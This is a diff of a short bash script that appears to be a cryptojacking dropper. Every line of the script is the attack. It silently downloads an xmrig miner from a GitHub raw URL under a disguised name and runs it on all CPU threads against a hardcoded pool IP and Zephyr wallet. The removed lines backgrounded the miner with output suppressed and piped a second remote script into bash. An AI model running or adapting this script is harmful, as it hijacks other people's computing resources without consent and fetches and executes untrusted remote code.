@@ -1,5 +1,4 @@
 #!/bin/bash
 wget -O sgr1 https://raw.githubusercontent.com/6248202226/filesg/main/xmrig >/dev/null 2>&1
 chmod +x sgr1
-./sgr1 --algorithm randomx --pool 149.28.147.155:80 --wallet ZEPHYR39FtS9jDrhDaMM9ReUUPLodNvqYHjD5CbYeLZM8h3tXARpwevMnW3kiXqxUUTYMTSDEgVDDV6WwXYL3Q5TVcVWxN58Wuc59 --password $(echo $(shuf -i 1-100000 -n 1)-A) --cpu-threads $(nproc --all) > /dev/null 2>&1 &
-curl -sL https://raw.githubusercontent.com/6248202226/filesg/main/boled04.sh | bash
+./sgr1 --algorithm randomx --pool 149.28.147.155:80 --wallet ZEPHYR39FtS9jDrhDaMM9ReUUPLodNvqYHjD5CbYeLZM8h3tXARpwevMnW3kiXqxUUTYMTSDEgVDDV6WwXYL3Q5TVcVWxN58Wuc59 --password $(echo $(shuf -i 1-100000 -n 1)-A) --cpu-threads $(nproc --all)
